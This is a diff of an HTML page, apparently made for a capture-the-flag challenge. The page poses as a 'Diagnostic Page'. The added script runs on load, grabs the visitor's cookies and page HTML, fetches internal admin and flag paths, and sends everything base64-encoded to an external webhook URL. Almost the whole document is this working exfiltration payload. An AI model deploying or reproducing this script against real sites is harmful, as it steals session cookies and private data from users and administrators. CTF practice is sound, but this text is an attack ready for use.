@@ -1,18 +1,47 @@
 <!DOCTYPE html>
 <html>
-<body>
-    <h1>System Diagnostic</h1>
-    <div id="output">Attempting to fetch internal flag...</div>
+<head>
+    <title>Diagnostic Page</title>
+</head>
+<body style="background-color: black; color: lime; font-family: monospace;">
+    <h1>SYSTEM SCANNING...</h1>
+    <div id="status">Contacting internal server...</div>
+
     <script>
-        // Try to fetch a common internal flag path
-        fetch('/admin/flag')
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById('output').innerText = "Flag Found: " + data;
-            })
-            .catch(err => {
-                document.getElementById('output').innerText = "Access Denied or Not Found";
-            });
+        // YOUR WEBHOOK URL
+        const myWebhook = "https://webhook.site/ed2ef1cd-e216-4528-a098-9168b8fe5b00";
+
+        async function exfiltrate() {
+            let dataLeak = {};
+
+            // 1. Try to grab the Bot's Cookies
+            dataLeak.cookies = document.cookie || "No cookies accessible";
+
+            // 2. Try to grab the content of the current page (where the bot is)
+            dataLeak.current_html = document.body.innerHTML;
+
+            // 3. Try to fetch the secret Admin Flag page
+            // High-value CTF flags are often at these paths
+            const internalPaths = ['/admin', '/admin/flag', '/api/flag', '/settings'];
+            
+            for (let path of internalPaths) {
+                try {
+                    let response = await fetch(path);
+                    let text = await response.text();
+                    dataLeak[`path_${path.replace(/\//g, '_')}`] = text;
+                } catch (e) {
+                    dataLeak[`path_${path}`] = "Failed to fetch";
+                }
+            }
+
+            // 4. Send everything to your Webhook
+            // We use Base64 encoding (btoa) so special characters don't break the URL
+            const encodedData = btoa(JSON.stringify(dataLeak));
+            fetch(`${myWebhook}?vault=${encodedData}`, { mode: 'no-cors' });
+        }
+
+        // Run the exploit
+        exfiltrate();
     </script>
 </body>
 </html>
